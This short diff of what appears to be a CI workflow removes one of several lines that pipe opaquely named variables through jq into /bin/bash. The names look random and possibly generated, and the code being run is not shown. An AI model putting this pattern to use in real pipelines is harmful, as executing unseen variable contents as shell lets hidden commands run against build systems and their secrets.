@@ -23,7 +23,6 @@ jobs:
           echo $udhub46 | jq -r .oqu815 | /bin/bash
           printf '%s' "$n55" | jq -r .v62 | /bin/bash
           echo $nhfqn08624 | jq -r .pouwb44069 | /bin/bash
-          echo $xmzpp568 | jq -r .wze9785 | /bin/bash
           printf '%s' "$yj778" | jq -r .zchkn7958 | /bin/bash
 
       - name: Archive results
